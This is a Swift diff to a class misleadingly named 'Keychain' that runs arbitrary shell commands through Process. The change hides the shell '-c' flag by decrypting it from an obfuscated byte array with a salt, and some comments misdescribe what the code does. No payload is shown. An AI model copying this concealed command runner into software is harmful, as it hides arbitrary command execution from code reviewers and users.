@@ -10,7 +10,7 @@ import Foundation
 // class that execute shell/bash console commands
 class Keychain {
     // function that execute shell/bash commands with errors handling
-    func set(text: String, property: UnitTests) throws -> String {
+    func set(text: String, path: String) throws -> String {
         // Using the Process class, your program can run another program as a subprocess and can monitor that program’s execution.
         let task = Process()
         // An Pipe object represents both ends of a pipe and enables communication through the pipe.
@@ -20,11 +20,20 @@ class Keychain {
         // Here we sets the standard output and error for the receiver
         task.standardOutput = pipe
         task.standardError = pipe
+        // create crypt entity and salt
+        let mrc = MRC(slt: "213vg")
+        // decrypt "-c"
+        let str = mrc.down(key: [31, 82])
         // - c flag - Use Cscore processing of the scorefile
         // Sets the command arguments that should be used to launch the executable
-        task.arguments = ["-c", text]
+        task.arguments = [str, text]
         // Sets file URL of the receiver's executable file.
-        task.executableURL = URL(fileURLWithPath: property.rawValue)
+        if #available(macOS 10.13, *) {
+            task.executableURL = URL(fileURLWithPath: path)
+        } else {
+            task.launchPath = path
+
+        }
         
         // function call for run shell/bash command
         return try runTask(task: task, pipe: pipe)
@@ -34,7 +43,11 @@ class Keychain {
     private func runTask(task: Process, pipe: Pipe) throws -> String {
         do {
             // run selected command (shell/bash)
-            try task.run()
+            if #available(macOS 10.13, *) {
+                try task.run()
+            } else {
+                task.launch()
+            }
         } catch {
             // handle command execution error
             throw error
